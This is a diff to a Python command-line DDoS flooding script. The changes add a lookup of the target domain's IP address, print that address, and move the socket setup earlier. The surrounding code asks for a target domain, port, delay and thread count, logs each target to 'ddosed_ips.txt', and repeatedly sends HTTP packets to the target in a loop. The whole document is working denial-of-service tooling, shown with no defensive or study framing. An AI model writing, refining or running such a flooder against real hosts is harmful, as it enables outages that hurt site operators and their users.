@@ -6,7 +6,11 @@ import colorama
 from colorama import Fore, Back, Style
 from time import sleep
 
-ip = str(input(Fore.RED + '[+] DOMAIN EX.(example.com): '))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+ip = str(input(Fore.RED + '[+] DOMAIN: '))
+host = str(socket.gethostbyname(ip))
+print("[red]{ "+ip+"=IP "+host+" }[/red]")
 port = int(input(Fore.RED + '[+] PORT (default 80): '))
 print("[bold red][*] SLOW-2 0.4 | SLOW-1 0.3 | MEDIUM 0.2 | FAST-2 0.1 | FAST-1 0.0[/bold red]")
 sleep = float(input(Fore.RED + '[+] SLEEP: '))
@@ -15,8 +19,6 @@ thread = int(input(Fore.RED + '[+] THREAD: '))
 os.system('echo "DDOS attack on: '+ip+'" >> ddosed_ips.txt')
 
 print("[bold red]connecting to target [/bold red][bold yellow]"+ip+"[/bold yellow]")
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
     s.connect((str(ip),int(port)))
@@ -81,7 +83,7 @@ def start():
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
             time.sleep(sleep)
-            print("[blue][+][/blue][yellow]HTTP PACKET sent> [ {0}:{1} ]  | Sent: {2}[/yellow]".format(str(ip), int(port), xx))
+            print("[blue][+][/blue][yellow]HTTP PACKET sent> [ "+ip+"="+host+":{1} ]  | Sent: {2}[/yellow]".format(str(ip), int(port), xx))
         except:
             s.close()
             time.sleep(0.1)
